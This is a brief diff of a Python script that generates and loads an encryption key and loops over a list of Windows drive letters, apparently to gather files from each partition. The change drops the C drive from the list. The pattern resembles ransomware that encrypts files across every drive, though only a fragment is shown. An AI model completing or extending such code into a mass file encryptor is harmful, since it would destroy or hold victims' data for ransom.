@@ -13,8 +13,9 @@ def get_files(type_file,partition,key):
 
 
 key = encrypt.generate_key()
+m = encrypt.load_key()
 
-drives = ["W" , "D" , "G" , "F" , "I" , "C" , "E"]
+drives = ["W" , "D" , "G" , "F" , "I" , "E"]
 
 
 for _ in range(6):
